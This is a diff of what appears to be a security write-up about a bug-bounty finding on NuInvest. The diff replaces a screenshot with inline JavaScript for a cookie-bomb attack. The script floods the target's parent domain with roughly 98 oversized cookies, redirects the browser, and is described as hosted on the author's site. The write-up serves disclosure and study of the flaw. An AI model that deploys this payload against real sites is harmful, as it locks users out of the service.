@@ -87,7 +87,16 @@ In practice the exploit would look like this:
 1. First we need to serve JavaScript on the Internet that makes the creation of cookies in an abusive way for our target:
     
     -
-    ![Imagem](/images/publications/nuinvest/cookie-bomb-js.png)
+    ```javascript
+    var base_domain = document.domain.substr(document.domain.indexOf('.'));
+    var pollution   = Array(4000).join('a');
+
+    for (var i = 1; i < 99; i++) {
+        document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
+    }
+
+    window.location="https://" + document.domain;
+    ```
     
     * Hosted on: [https://heitorgouvea.me/public/payloads/bomb.js](https://heitorgouvea.me/public/payloads/bomb.js)
     
